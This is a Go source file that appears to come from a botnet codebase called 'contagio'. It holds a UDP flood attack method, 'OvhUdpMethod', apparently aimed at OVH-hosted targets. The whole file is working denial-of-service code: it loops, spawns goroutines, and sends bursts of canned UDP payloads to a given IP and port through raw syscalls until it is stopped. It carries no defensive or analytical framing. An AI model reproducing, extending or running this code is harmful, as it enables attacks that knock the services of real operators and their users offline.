package methods

import (
	"contagio/bot/config"
	"contagio/bot/utils"
	"context"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"syscall"
	"time"
)

func OvhUdpMethod(ctx context.Context, ipaddr, _port string) {

	defer Catch()

	if config.DEBUG {
		fmt.Println("[ovhudp] Attack started")
	}

	port, err := strconv.Atoi(_port)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[ovhudp atoi] Port atoi error: " + err.Error())
		}
		return
	}

	for {
		select {
		case <-ctx.Done():
			if config.DEBUG {
				fmt.Println("[ovhudp] Attack stopped")
			}
			return
		case <-utils.StopChan:
			if config.DEBUG {
				fmt.Println("[ovhudp] Cpu balancer")
			}
			time.Sleep(5 * time.Second)
		default:

			rand.NewSource(time.Now().UnixNano())

			packet := []byte(utils.GetArrayVal(utils.UdpHexStrings))

			go ovhudp(net.ParseIP(ipaddr).To4(), port, packet)
			go ovhudp(net.ParseIP(ipaddr).To4(), port, packet)
			go ovhudp(net.ParseIP(ipaddr).To4(), port, packet)

			time.Sleep(10 * time.Millisecond)
		}
	}

}

func ovhudp(ip net.IP, port int, packet []byte) {
	defer Catch()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
	if err != nil {
		return
	}

	defer syscall.Close(fd)

	addr := syscall.SockaddrInet4{
		Port: port,
		Addr: [4]byte(ip),
	}

	for i := 0; i <= 60; i++ {
		syscall.Sendto(fd, packet, 0, &addr)
		syscall.Connect(fd, &addr)

		time.Sleep(10 * time.Millisecond)
	}

}
